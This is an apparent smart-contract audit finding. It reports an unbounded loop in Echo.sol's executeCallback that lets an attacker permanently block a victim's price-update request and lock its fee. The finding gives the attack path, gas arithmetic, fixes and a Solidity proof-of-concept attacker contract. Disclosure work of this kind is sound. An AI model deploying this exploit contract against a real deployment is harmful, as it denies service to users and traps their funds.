### Title
Unbounded `firstUnfulfilledSeq` Linear Scan in `executeCallback` Enables DoS via Gas Exhaustion — (`File: target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.sol`'s `executeCallback` function contains an unbounded `while` loop that linearly scans forward through all fulfilled sequence numbers to advance `_state.firstUnfulfilledSeq`. An unprivileged attacker can create a large number of requests and fulfill all but one earlier request, causing the while loop to iterate thousands of times when that earlier request is eventually fulfilled. If the iteration count is large enough, the loop exceeds the block gas limit, permanently preventing the targeted request from ever being fulfilled and locking the requester's funds.

---

### Finding Description

In `Echo.sol`, after `clearRequest(sequenceNumber)` is called, the following loop executes:

```solidity
while (
    _state.firstUnfulfilledSeq < _state.currentSequenceNumber &&
    !isActive(findRequest(_state.firstUnfulfilledSeq))
) {
    _state.firstUnfulfilledSeq++;
}
``` [1](#0-0) 

Each iteration performs:
1. A warm `SSTORE` to increment `_state.firstUnfulfilledSeq` (~2,900 gas after the first write)
2. A call to `findRequest()`, which computes a `keccak256` key and performs an `SLOAD` on `_state.requests[shortKey]` (warm, ~100 gas) and, for overflow entries, a cold `SLOAD` on `_state.requestsOverflow[key]` (~2,100 gas) [2](#0-1) 

The fixed-size `requests` array has only 32 slots (`NUM_REQUESTS = 32`). Any request beyond 32 concurrent active requests is stored in the `requestsOverflow` mapping, keyed by `keccak256(abi.encodePacked(sequenceNumber))`. [3](#0-2) [4](#0-3) 

Each overflow mapping slot is a distinct storage slot (cold, 2,100 gas per `SLOAD`). The per-iteration cost is approximately **5,000–5,100 gas**. With a 30M gas block limit, the loop can run at most ~5,882 iterations before the transaction reverts.

The developers themselves flagged this in a TODO comment:

> "TODO: I'm pretty sure this is going to use a lot of gas because it's doing a storage lookup for each sequence number. a better solution would be a doubly-linked list of active requests." [5](#0-4) 

**Attack path:**

1. Victim submits request with sequence number `V` (paying the required fee).
2. Attacker calls `requestPriceUpdatesWithCallback` N times, creating requests `V+1, V+2, ..., V+N`. `currentSequenceNumber` advances to `V+N+1`.
3. Attacker calls `executeCallback` for each of requests `V+1` through `V+N`, providing valid Pyth price update data (publicly available). After each fulfillment, the while loop tries to advance `firstUnfulfilledSeq` from its current position but immediately stops because request `V` is still active. `firstUnfulfilledSeq` stays at `V`.
4. When anyone (victim, provider, or third party) attempts to fulfill request `V`, `clearRequest(V)` succeeds, but the while loop then iterates from `V` through `V+N` — N+1 iterations — consuming ~5,100 × N gas.
5. If N ≥ ~5,882, the transaction always reverts due to out-of-gas. Request `V` can never be cleared, and the requester's fee is permanently locked.

`executeCallback` is callable by anyone (no access control beyond the exclusivity period check): [6](#0-5) 

There is no `cancelRequest` function in `Echo.sol`, so the victim has no recourse to recover their locked funds.

---

### Impact Explanation

- **Permanent DoS on a specific request**: The targeted request can never be fulfilled because every attempt to execute its callback reverts out-of-gas in the while loop.
- **Permanent fund lock**: The fee paid by the requester for request `V` is locked in the contract with no withdrawal path.
- **Scope**: Affects any user of the Echo price-update-with-callback service. The attacker can target any in-flight request by front-running it or by observing the sequence number and creating subsequent requests.

---

### Likelihood Explanation

- `requestPriceUpdatesWithCallback` and `executeCallback` are both permissionless external functions.
- Valid Pyth price update data is publicly available (from Hermes/price service), so the attacker can fulfill their own requests without any privileged access.
- The economic cost scales with the number of requests needed (~6,000 requests). At a low fee per request (e.g., the minimum `pythFeeInWei`), the attack cost is bounded and feasible for a motivated attacker.
- The attacker can partially recover costs by registering as a provider and collecting `accruedFeesInWei` from their own fulfilled requests.
- No leaked keys, governance majority, or trusted role is required.

---

### Recommendation

Replace the unbounded while loop with a bounded or O(1) mechanism:

1. **Doubly-linked list of active requests** (as noted in the TODO): maintain `prev`/`next` pointers so that clearing a request updates `firstUnfulfilledSeq` in O(1).
2. **Remove `firstUnfulfilledSeq` tracking from `executeCallback`**: move the scan to an off-chain keeper or a separate, gas-bounded view function (`getFirstActiveRequests` already exists for this purpose).
3. **Cap the while loop**: add a maximum iteration count (e.g., `NUM_REQUESTS`) so the loop cannot run unboundedly, accepting that `firstUnfulfilledSeq` may lag.

---

### Proof of Concept

```solidity
// Attacker contract
contract EchoDoSAttack {
    IEcho echo;
    address provider;
    bytes32[] priceIds;
    uint32 callbackGasLimit;

    constructor(address _echo, address _provider, bytes32[] memory _priceIds) {
        echo = IEcho(_echo);
        provider = _provider;
        priceIds = _priceIds;
        callbackGasLimit = 100_000;
    }

    // Step 1: Victim creates request V (sequence number V)
    // Step 2: Attacker calls this function to create N requests after V
    //         and immediately fulfill them, leaving V stuck
    function bloatAndLock(
        bytes[] calldata updateData,
        uint256 N
    ) external payable {
        uint96 fee = echo.getFee(provider, callbackGasLimit, priceIds);
        require(msg.value >= fee * N, "insufficient funds");

        uint64[] memory seqNums = new uint64[](N);

        // Create N requests
        for (uint256 i = 0; i < N; i++) {
            seqNums[i] = echo.requestPriceUpdatesWithCallback{value: fee}(
                provider,
                block.timestamp,
                priceIds,
                callbackGasLimit
            );
        }

        // Fulfill all N requests (valid updateData required)
        for (uint256 i = 0; i < N; i++) {
            echo.executeCallback(provider, seqNums[i], updateData, priceIds);
        }
        // firstUnfulfilledSeq is now stuck at V (victim's request)
        // Any attempt to fulfill V will iterate N+1 times in the while loop
        // and revert out-of-gas when N >= ~5882
    }
}
```

### Citations

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L105-121)
```text
    function executeCallback(
        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable override {
        Request storage req = findActiveRequest(sequenceNumber);

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L166-168)
```text
        // TODO: I'm pretty sure this is going to use a lot of gas because it's doing a storage lookup for each sequence number.
        // a better solution would be a doubly-linked list of active requests.
        // After successful callback, update firstUnfulfilledSeq if needed
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L169-174)
```text
        while (
            _state.firstUnfulfilledSeq < _state.currentSequenceNumber &&
            !isActive(findRequest(_state.firstUnfulfilledSeq))
        ) {
            _state.firstUnfulfilledSeq++;
        }
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L310-321)
```text
    function findRequest(
        uint64 sequenceNumber
    ) internal view returns (Request storage req) {
        (bytes32 key, uint8 shortKey) = requestKey(sequenceNumber);

        req = _state.requests[shortKey];
        if (req.sequenceNumber == sequenceNumber) {
            return req;
        } else {
            req = _state.requestsOverflow[key];
        }
    }
```

**File:** target_chains/ethereum/contracts/contracts/echo/EchoState.sol (L6-7)
```text
    uint8 public constant NUM_REQUESTS = 32;
    bytes1 public constant NUM_REQUESTS_MASK = 0x1f;
```

**File:** target_chains/ethereum/contracts/contracts/echo/EchoState.sol (L66-68)
```text
        Request[NUM_REQUESTS] requests;
        mapping(bytes32 => Request) requestsOverflow;
        mapping(address => ProviderInfo) providers;
```
